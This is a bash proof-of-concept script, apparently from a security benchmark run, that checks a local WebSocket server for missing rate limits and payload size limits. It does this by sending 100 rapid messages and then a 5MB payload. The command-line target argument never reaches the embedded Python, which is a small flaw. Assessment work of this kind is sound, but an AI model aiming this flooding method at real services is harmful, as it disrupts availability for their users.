#!/bin/bash
# POC: WebSocket DoS vulnerability testing - message flooding and large payload attacks
# Target: ./repo
# Created: 2025-11-04T17:12:08.848Z
# Session: benchmark-XBEN-023-24-mhktion0

# WebSocket DoS Vulnerability POC - Demonstrates the attack method
# This POC shows how an attacker would exploit the lack of rate limiting and payload size restrictions

TARGET="${1:-ws://localhost:8000/ws}"

echo "[*] WebSocket DoS Vulnerability Proof of Concept"
echo "[*] Target: $TARGET"
echo ""
echo "[+] This POC demonstrates two attack vectors:"
echo "    1. Rapid message flooding without rate limiting"
echo "    2. Large payload attacks without size restrictions"
echo ""

# Check if we can connect to any WebSocket service
echo "[*] Checking for WebSocket connectivity..."

# Try to find and connect to a running WebSocket server
if command -v python3 &> /dev/null; then
    
    python3 << 'EOF'
import websocket
import sys
import time

target = sys.argv[1] if len(sys.argv) > 1 else "ws://localhost:8000/ws"

# Try common alternative ports if default fails
ports_to_try = ["8000", "8080", "3000", "5000", "9000"]
hosts = ["localhost", "127.0.0.1", "0.0.0.0"]

ws_url = None
ws = None

# Parse target to extract host and port
if target.startswith("ws://"):
    target = target[5:]
if "/" in target:
    target = target.split("/")[0]

if ":" in target:
    host, port = target.rsplit(":", 1)
    ports_to_try = [port] + ports_to_try
else:
    host = target
    ports_to_try = ["8000"] + ports_to_try

print(f"[*] Attempting to connect to WebSocket server...")
print(f"[*] Host: {host}")

# Try to establish connection
for port in ports_to_try:
    try:
        ws_url = f"ws://{host}:{port}/ws"
        print(f"[*] Trying {ws_url}...")
        ws = websocket.create_connection(ws_url, timeout=3)
        print(f"[+] Successfully connected to {ws_url}")
        break
    except:
        continue

if ws is None:
    print("[-] Could not establish WebSocket connection")
    print("[*] This POC requires an active WebSocket server")
    print("[*] The vulnerability exists when:")
    print("    - Server accepts 100+ rapid messages without throttling")
    print("    - Server accepts 5MB+ payloads without size limiting")
    sys.exit(0)

# Vulnerability Test 1: Message Flooding
print("\n[+] Test 1: Message Flooding (100 messages)")
print("[*] Sending rapid messages without delays...")

messages_sent = 0
start = time.time()

try:
    for i in range(100):
        ws.send(f"FLOOD_{i}")
        messages_sent += 1
except:
    pass

elapsed = time.time() - start

if messages_sent >= 90:
    print(f"[+] Sent {messages_sent}/100 messages in {elapsed:.2f}s")
    print(f"[!] VULNERABLE: No rate limiting detected")
else:
    print(f"[!] Server rate-limited after {messages_sent} messages")

# Vulnerability Test 2: Large Payload
print("\n[+] Test 2: Large Payload Attack (5MB)")
print("[*] Sending 5MB+ payload...")

try:
    large_payload = "X" * (5 * 1024 * 1024)  # 5MB
    ws.send(large_payload)
    print(f"[+] Successfully sent 5MB payload")
    print(f"[!] VULNERABLE: No size limit enforced")
except Exception as e:
    if "payload too large" in str(e).lower() or "message too big" in str(e).lower():
        print(f"[!] Server enforces size limits: {e}")
    else:
        print(f"[!] Error: {e}")

ws.close()

print("\n[+] DoS vulnerability assessment complete")

EOF

    exit_code=$?
    if [ $exit_code -eq 0 ]; then
        exit 0
    fi
else
    echo "[-] Python3 not available"
    exit 1
fi